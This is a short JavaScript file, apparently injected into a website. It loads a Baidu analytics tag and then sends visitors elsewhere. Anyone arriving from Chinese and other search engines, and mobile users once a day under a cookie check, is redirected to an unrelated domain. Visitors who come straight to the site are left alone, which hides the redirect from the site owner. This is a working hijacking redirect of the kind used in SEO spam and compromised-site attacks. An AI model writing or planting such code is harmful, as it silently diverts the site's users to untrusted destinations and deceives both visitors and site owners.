var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f621bba78f6c9e1a7cb4c20fecc9ee76";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

var regexp=/\.(sogou|soso|baidu|bsb|youdao|lanjie|bing|118114|biso|sm|qq|so|safe|toutiao|biso|360)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
if(regexp.test(where))
{
window.location.href="https://www.bnbnwr2313.com";
}
 function haszjcook() {  
        //================  
        var s = document.cookie;  
        if (s.indexOf('zjpro=1') != -1) 
        {
        	//document.write( "hi");
        	return false; //存在cookie退出下面代码的执行  
    	}
        var d = new Date();  
        d.setHours(d.getHours() + 24); //有效期24小时  
        document.cookie = 'zjpro=1;expires='+d.toGMTString();//设置cookie 
        return true;
 }  
 function ismo(){
    var browser = navigator.userAgent.toLowerCase();
    var phone = /iphone|ipod|ipad|android|mobile|blackberry|webos|incognito|webmate|bada|nokia|lg|ucweb|skyfire|micromessenger/i
    return phone.test(browser);
 }
 function jumptourl(url)
 {
 	top.location.href=url;
 }
 if(ismo() && haszjcook())
{
	jumptourl("https://www.bnbnwr2313.com") 
} 

